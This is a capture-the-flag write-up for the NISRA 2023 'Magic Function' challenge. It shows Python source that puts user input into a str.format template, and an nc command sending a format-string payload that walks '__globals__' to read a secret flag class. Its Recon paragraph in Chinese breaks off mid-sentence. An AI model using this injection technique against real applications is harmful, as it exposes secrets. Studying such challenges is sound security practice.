---
title: NISRA 2023 Enlightened - Magic Function
tags: [NISRA, CTF, Misc]

category: "Security/Practice/NISRA/Misc"
---

# NISRA 2023 Enlightened - Magic Function
## Background
[Magic Function of Python](https://hacktricks.boitatech.com.br/misc/basic-python/magic-methods)

## Source Code
```python=
class Test():
	def __init__(self, email='test@nisra.net'):
		self.info = 'test'
		self.email = email

class Secret():
	flag = open("./NISRA-Enlightened-2023/flag.txt", "r").read().strip()


if __name__ == '__main__':
	email = input('Your email: ')

	if email:
		test = Test(email)
	else:
		test = Test()

	msg = ('this is for {test.info}, please contact ' + email + '.').format(test=test)

	print(msg)
```


## Recon
這一題真的很有趣，但也是算通靈的奇淫怪招，仔細看了一下直覺應該是跟format string有關係，比賽的時候的確有想到，但我當時想的payload有點偏掉了，當時的payload是: `{test.email}.format(test=Test(Secret().flag))`，也就是先傳入Secret().flag給Test這個class，然後再利用format傳入給

## Exploit
```bash
$ echo "{test.__init__.__globals__[Secret].flag}" | nc chall2.nisra.net 43001
Your email: this is for test, please contact NISRA{Ma9ic_pY3h0n_!!???}.
```

Flag: `NISRA{Ma9ic_pY3h0n_!!???}`